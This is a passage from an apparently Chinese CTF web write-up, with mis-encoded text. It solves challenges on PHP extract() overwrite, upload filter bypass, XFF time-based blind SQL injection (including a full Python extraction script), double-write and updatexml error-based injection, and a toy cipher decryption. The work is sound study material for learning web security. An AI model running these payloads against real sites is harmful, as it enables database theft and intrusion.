id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>POST:passwd[]=<span class="hljs-number">2</span></code></pre></div><p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt></p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>extract($_GET);<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ac))&#123;$f = trim(file_get_contents($fn));<span class="hljs-keyword">if</span> ($ac === $f)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;This is flag:"</span> .<span class="hljs-string">" $flag&lt;/p&gt;"</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>extract</strong>å‡½æ•°ä½œç”¨</p><p>(PHP 4, PHP 5, PHP 7)</p><p>extract â€” ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p><p>è¯´æ˜</p><p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p><p>æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚</p><p>æ£€æŸ¥æ¯ä¸ªé”®åçœ‹æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ä¸ªåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²æœ‰çš„å˜é‡åçš„å†²çªã€‚</p><p><strong>trim</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>trim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰</p><p>è¯´æ˜</p><p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = â€œ \t\n\r\0\x0Bâ€ ] ) : string</p><p>æ­¤å‡½æ•°è¿”å›å­—ç¬¦ä¸² <code>str</code> å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦åçš„ç»“æœã€‚å¦‚æœä¸æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ï¼Œ<strong>trim()</strong> å°†å»é™¤è¿™äº›å­—ç¬¦ï¼š</p><ul><li>â€œ â€œ (ASCII <code>32</code> (<code>0x20</code>))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚</li><li>â€œ\tâ€ (ASCII <code>9</code> (<code>0x09</code>))ï¼Œåˆ¶è¡¨ç¬¦ã€‚</li><li>â€œ\nâ€ (ASCII <code>10</code> (<code>0x0A</code>))ï¼Œæ¢è¡Œç¬¦ã€‚</li><li>â€œ\râ€ (ASCII <code>13</code> (<code>0x0D</code>))ï¼Œå›è½¦ç¬¦ã€‚</li><li>â€œ\0â€ (ASCII <code>0</code> (<code>0x00</code>))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚</li><li>â€œ\x0Bâ€ (ASCII <code>11</code> (<code>0x0B</code>))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚</li></ul><p><strong>file_get_contents</strong></p><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p><p>file_get_contents â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>ä»£ç çš„å¤§è‡´å«ä¹‰å°±æ˜¯</p><p>getæ–¹å¼æäº¤å‚æ•°ï¼Œç”¨extractå‡½æ•°å°†å˜é‡å†™å…¥ç¬¦å·è¡¨ä¸­ï¼Œå¦‚æœgetæäº¤çš„å‚æ•°ä¸­åŒ…å«$acï¼Œåˆ™åˆ©ç”¨file_get_contentå‡½æ•°ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹å¹¶èµ‹å€¼ç»™$f,å¦‚æœ$ac===$fåˆ™æ‹¿åˆ°flag</p><p>è¿™é‡Œéœ€è¦åˆ©ç”¨phpçš„ä¼ªåè®®å†™å…¥å†…å®¹ php://input</p><p>payload</p><div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span><span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre></div><h2 id="ç»†å¿ƒ"><a href="#ç»†å¿ƒ" class="headerlink" title="ç»†å¿ƒ"></a>ç»†å¿ƒ</h2><p>é¢˜ç›®ç½‘ç«™å´©äº†</p><h2 id="æ±‚getshell"><a href="#æ±‚getshell" class="headerlink" title="æ±‚getshell"></a>æ±‚getshell</h2><p>æ–‡ä»¶ä¸Šä¼ </p><p>é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸäº†å¹¶è¿”å›ä¿å­˜è·¯å¾„</p><p>å†ä¸Šä¼ ä¸€ä¸ªphpçš„æ–‡ä»¶ï¼Œæç¤º<code>Invalid file</code></p><p>ä¸Šä¼ .htaccess, .user.iniéƒ½æç¤º<code>you got it</code></p><p>ä¸¤ç§æç¤ºä¸ä¸€æ ·çŒœæµ‹å¯èƒ½å­˜åœ¨åç¼€é»‘åå•å’Œæ–‡ä»¶ç±»å‹æ£€æµ‹ã€‚</p><p>ä¸Šä¼ ä¸€ä¸ªphp5æ–‡ä»¶å¹¶bpæŠ“åŒ…ä¿®æ”¹MIME(Content-Type)ä¸º image/.jpegè¿˜æ˜¯æç¤ºinvalid file </p><p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" srcset="/img/loading.gif" alt="getshell1.png"></p><p>å†ä¿®æ”¹è¯·æ±‚å¤´éƒ¨çš„Content-Typeï¼Œåˆ©ç”¨å¤§å°å†™ç»•è¿‡ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" srcset="/img/loading.gif" alt="getshell2.png"></p><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š</p><p><strong>è¯·æ±‚ä¸­çš„Content-Type</strong></p><p>åœ¨è¯·æ±‚ä¸­ (å¦‚POST æˆ– PUT)ï¼ŒContent-Typeå­—æ®µç”¨äºå®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨å®é™…å‘é€çš„æ•°æ®ç±»å‹ã€‚å½“ä½ å‘é€ä¸€ä¸ªHTTPçš„POSTè¯·æ±‚æ—¶ï¼Œéœ€è¦è®¾ç½®è¯·æ±‚å¤´ä¸­çš„Content-Typeå­—æ®µï¼Œå‘Šè¯‰æœåŠ¡ç«¯ä½ å‘é€çš„æ•°æ®æ˜¯ä»€ä¹ˆç±»å‹çš„ã€‚</p><p><strong>è®¾ç½®è¯·æ±‚å¤´ä¸­çš„Content-Type</strong></p><p>å½“å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·HTTPçš„POSTè¯·æ±‚æ—¶ï¼Œéœ€è¦å‘Šè¯‰æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬å‘é€çš„æ•°æ®ç±»å‹ï¼Œæ–¹ä¾¿æœåŠ¡ç«¯å»è§£ææ•°æ®ã€‚å¦‚æœä½ ä¸è®¾ç½®ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å¯èƒ½æ— æ³•å¤„ç†ä½ çš„è¯·æ±‚ã€‚</p><h2 id="INSERT-INTOæ³¨å…¥"><a href="#INSERT-INTOæ³¨å…¥" class="headerlink" title="INSERT INTOæ³¨å…¥"></a>INSERT INTOæ³¨å…¥</h2><p>æç¤ºäº†insert intoæ³¨å…¥</p><p>å¹¶ç»™å‡ºäº†æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span><span class="hljs-params">()</span></span>&#123;$ip = <span class="hljs-string">''</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]))&#123; <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨xxf</span>$ip = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];<span class="hljs-comment">//å­˜åœ¨åˆ™ä¼˜å…ˆä½¿ç”¨xxf</span>&#125;<span class="hljs-keyword">else</span>&#123;$ip = $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];<span class="hljs-comment">//remote_addr</span>&#125;$ip_arr = explode(<span class="hljs-string">','</span>, $ip);<span class="hljs-comment">//è¿‡æ»¤ ,</span><span class="hljs-keyword">return</span> $ip_arr[<span class="hljs-number">0</span>];&#125;$host=<span class="hljs-string">"localhost"</span>;$user=<span class="hljs-string">""</span>;$pass=<span class="hljs-string">""</span>;$db=<span class="hljs-string">""</span>;$connect = mysql_connect($host, $user, $pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to connect"</span>);<span class="hljs-comment">//è¿æ¥æ•°æ®åº“</span>mysql_select_db($db) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to select database"</span>);$ip = getIp();<span class="hljs-keyword">echo</span> <span class="hljs-string">'your ip is :'</span>.$ip;$sql=<span class="hljs-string">"insert into client_ip (ip) values ('$ip')"</span>; <span class="hljs-comment">//æ³¨å…¥ç‚¹</span>mysql_query($sql);<span class="hljs-meta">?&gt;</span></code></pre></div><p>ç½‘é¡µæ˜¾ç¤ºå‡ºè‡ªå·±çš„ipåœ°å€ï¼Œæƒ³åˆ°çš„æ˜¯xffå¤´ï¼Œä¿®æ”¹äº†xffå¤´çš„å†…å®¹åï¼Œé¡µé¢å›æ˜¾ä¹Ÿä¼šæ”¹å˜ï¼Œæ‰€ä»¥å°±æ˜¯xffæ³¨å…¥ã€‚</p><p>æŠ“åŒ…æ·»åŠ xxfå¤´ï¼Œå¹¶æ„é€ æ³¨å…¥è¯­å¥,è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†é€—å·ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ifè¯­å¥ï¼Œåˆå› ä¸ºæ²¡æœ‰å›æ˜¾æ‰€ä»¥è¦ä½¿ç”¨åŸºäºæ—¶é—´çš„ç›²æ³¨</p><div class="hljs"><pre><code class="hljs arcade"><span class="hljs-symbol">$ip</span>_arr = explode(<span class="hljs-string">','</span>, <span class="hljs-symbol">$ip</span>);   <span class="hljs-comment">//è¿‡æ»¤äº†,</span></code></pre></div><p>ä»£æ›¿ifçš„æ³¨å…¥è¯­å¥å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs angelscript">select <span class="hljs-keyword">case</span> when è¯­å¥<span class="hljs-number">1</span> then è¯­å¥<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> è¯­å¥<span class="hljs-number">3</span> end;<span class="hljs-comment">//å«ä¹‰å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å½“è¯­å¥1ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œè¯­å¥2ï¼Œå¦åˆ™æ‰§è¡Œè¯­å¥3</span></code></pre></div><p>æ‰€ä»¥è¦æ„é€ çš„æ³¨å…¥è¯­å¥ä¸º</p><div class="hljs"><pre><code class="hljs sql">11'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>//å½“æ•°æ®åº“åçš„é•¿åº¦ä¸º<span class="hljs-number">5</span>æ—¶ï¼Œåˆ™æ‰§è¡Œ<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>)ï¼Œå¦åˆ™ç»“æŸï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®ç½‘é¡µçš„å“åº”æ—¶é—´æ¥åˆ¤æ–­æŸ¥è¯¢è¯­å¥æ˜¯å¦æ­£ç¡®</code></pre></div><p>å¸¦å…¥åŸè¯­å¥</p><div class="hljs"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'$ip'</span>)<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'11'</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>//å¯ä»¥çœ‹åˆ°è¯­å¥æˆåŠŸæ³¨å…¥åˆ°åŸæŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¹¶å¯ä»¥æ­£å¸¸æ‰§è¡Œ</code></pre></div><p>åˆ¤æ–­å­—æ®µæ¯ä¸€ä¸ªå­—ç¬¦çš„å€¼</p><p>å¸¸ç”¨çš„è¯­å¥åº”è¯¥ä¸º</p><div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div><p>ä½†æ˜¯å› ä¸ºé€—å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æ”¹ä¸ºä¸‹é¢çš„è¯­å¥</p><div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sys<span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span><span class="hljs-comment">##client_ip,flag</span><span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name='flag' from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span>sql = <span class="hljs-string">"127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +"</span>url = <span class="hljs-string">'http://123.206.87.240:8002/web15/'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):    print(str(i))    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:            sys.exit(<span class="hljs-number">0</span>)        sqli = sql.format(i, chr(ch))        header = &#123;            <span class="hljs-string">'X-Forwarded-For'</span>: sqli        &#125;        <span class="hljs-keyword">try</span>:            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#å“åº”æ—¶é—´è¶…è¿‡3ç§’åˆ™ è¿›å…¥except å³å¯çŒœæµ‹æ˜¯æ­£ç¡®çš„</span>        <span class="hljs-keyword">except</span>:            flag += chr(ch)            print(flag)            <span class="hljs-keyword">break</span></code></pre></div><h2 id="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"><a href="#è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†"></a>è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a>å¤šæ¬¡</h2><p>tips</p><blockquote><p>æœ¬é¢˜æœ‰2ä¸ªflag<br>flagå‡ä¸ºå°å†™<br>flagæ ¼å¼ flag{}</p></blockquote><p>çœ‹åˆ°é¢˜ç›®æç¤ºï¼Œåº”è¯¥æ˜¯äºŒæ¬¡æ³¨å…¥</p><p>urlä¸­å­˜åœ¨idå‚æ•°ï¼Œå†idå‚æ•°ååŠ  â€˜åé¡µé¢æŠ¥é”™ï¼Œå†åŠ ä¸Š#åæ˜¾ç¤º <code>There is nothing</code></p><p>è¾“å…¥ id=1â€™or 1=1â€“+ æŠ¥é”™</p><p>ä½†æ˜¯è¾“å…¥id=1â€™oorr 1=1â€“+ æ—¶æ­£å¸¸äº†ï¼Œè¯´æ˜å­˜åœ¨å…³é”®è¯è¿‡æ»¤ï¼Œé€šè¿‡å¼‚æˆ–æ³¨å…¥å‘ç°è¿‡æ»¤äº†union,select,and,orç­‰å…³é”®è¯ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ã€‚</p><div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>'^(<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>)--+é¡µé¢æ˜¾ç¤ºé”™è¯¯æ­£å¸¸è¯´æ˜<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>æ˜¯é”™çš„ï¼Œå³<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)=<span class="hljs-number">0</span>ï¼Œè¯´æ˜unionæ›¿æ¢ä¸ºç©ºäº†å…¶ä»–å…³é”®è¯çš„æµ‹è¯•ä¹Ÿç±»ä¼¼</code></pre></div><p>å¼€å§‹æ³¨å…¥</p><div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><span class="hljs-string"></span><span class="hljs-string">database:flag1,hint</span><span class="hljs-string"></span><span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag1'</span><span class="hljs-comment">--+</span><span class="hljs-keyword">table</span>:flag1,address<span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span><span class="hljs-string">usOwycTju+FTUUzXosjr è§£ç ä¸ºï¼šå¥½å§ä½ ä¼šSQLæ³¨å…¥</span><span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>æ‹¿åˆ°ä¸‹ä¸€å…³çš„åœ°å€</code></pre></div><p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" srcset="/img/loading.gif" alt="sqls-1.png"></p><p>åŒæ ·å­˜åœ¨ä¸€ä¸ªæ³¨å…¥ç‚¹idï¼ŒåŠ å•å¼•å·å‘ç°æç¤ºäº†æŠ¥é”™ä¿¡æ¯ï¼Œå¾ˆæ˜æ˜¾æ˜¯æŠ¥é”™æ³¨å…¥</p><p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" srcset="/img/loading.gif" alt="sqls-2.png"></p><p>æŠ¥é”™æ³¨å…¥ä¸€èˆ¬æ˜¯å›ºå®šçš„æ¨¡æ¿</p><p>ä¸‹é¢ä½¿ç”¨updatexml()è¿›è¡Œæ³¨å…¥</p><blockquote><p>å‡½æ•°è¯­æ³•ï¼šupdatexml(XML_document, XPath_string, new_value);</p><p>é€‚ç”¨ç‰ˆæœ¬: 5.1.5+<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>æˆ‘ä»¬é€šå¸¸åœ¨ç¬¬äºŒä¸ªxpathå‚æ•°å¡«å†™æˆ‘ä»¬è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p></blockquote><p>payload</p><div class="hljs"><pre><code class="hljs sql">1' and updatexml(1,concat('~',(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-string">'~'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span><span class="hljs-keyword">database</span>:~<span class="hljs-keyword">class</span>,flag2~ ?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">' and updatexml(1,concat('</span>~<span class="hljs-string">',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>flag2<span class="hljs-string">'),'</span>~<span class="hljs-string">'),3) %23</span><span class="hljs-string">table:~flag2,address~</span><span class="hljs-string"># æŸ¥æ•°æ®</span><span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">'0x7e'</span>,(<span class="hljs-keyword">select</span> flag2 <span class="hljs-keyword">from</span> flag2),<span class="hljs-string">'0x7e'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span> æ‹¿åˆ°çœŸæ­£çš„flag</code></pre></div><p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" srcset="/img/loading.gif" alt="sqls-flag.png"></p><h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>é¢˜ç›®ç»™äº†æºç åˆ†æå¯çŸ¥æ˜¯ä¸€ä¸ªåŠ å¯†è¿‡ç¨‹ï¼Œå¹¶ä¸”ç»™äº†åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å†™å‡ºè§£å¯†è„šæœ¬å³å¯</p><p>åŠ å¯†åçš„æ•°æ®ä¸º</p><div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre></div><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($data,$key)</span></span><span class="hljs-function"></span>&#123;    $key = md5(<span class="hljs-string">'ISCC'</span>);    $x = <span class="hljs-number">0</span>;    $len = strlen($data);    $klen = strlen($key);    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123;         <span class="hljs-keyword">if</span> ($x == $klen)        &#123;            $x = <span class="hljs-number">0</span>;        &#125;        $char .= $key[$x];        $x+=<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123;        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="hljs-number">128</span>);    &#125;    <span class="hljs-keyword">return</span> base64_encode($str);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span><span class="hljs-function"></span>&#123;    $key = md5(<span class="hljs-string">'ISCC'</span>);  <span class="hljs-comment">// å¯¹å¯†é’¥è¿›è¡Œmd5åŠ å¯†</span>    $x=<span class="hljs-number">0</span>;    $str=base64_decode($str); <span class="hljs-comment">//å¯¹åŠ å¯†åçš„å­—ç¬¦ä¸²base64è§£ç </span>    $len=strlen($str);         $klen=strlen($key);    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)   <span class="hljs-comment">//è®¡ç®—å‡ºcharå­—ç¬¦æ•°ç»„ï¼Œç”¨äºæœ€åçš„å‡æ“ä½œ</span>    &#123;        <span class="hljs-keyword">if</span>($x==$klen)        &#123;            $x=<span class="hljs-number">0</span>;        &#125;        $char.=$key[$x];        $x+=<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)    &#123;        $data.=chr((ord($str[$i])-ord($char[$i])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//åŠ ä¸Š128ä¸ºäº†é˜²æ­¢å‡ºç°è´Ÿæ•°ã€‚</span>    &#125;    <span class="hljs-keyword">return</span> $data;&#125;<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>));<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" srcset="/img/loading.gif" alt="encode.png"></p><h2 id="æ–‡ä»¶åŒ…å«2"><a href="#æ–‡ä»¶åŒ…å«2" class="headerlink" title="æ–‡ä»¶åŒ…å«2"></a>æ–‡ä»¶åŒ…å«2</h2><p>ç½‘å€æ‰“ä¸å¼€</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>ç»™äº†æç¤ºhintï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¦æäº¤çš„å‚æ•°ï¼Œgetæäº¤hint,æ˜¾ç¤ºæºç </p><div class="hljs"><pre><code class="hljs php+HTML">&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;å«cookie å¯èƒ½éœ€è¦æŠ“åŒ…ä¿®æ”¹cookieif(isset($_GET[&#39;hint&#39;]))&#123;    show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;å¦‚æœååºåˆ—åŒ–åçš„$cookie&#x3D;&#x3D;&#x3D;$KEY æ‹¿åˆ°flag&#123;                                               echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;    &lt;p&gt;&lt;input 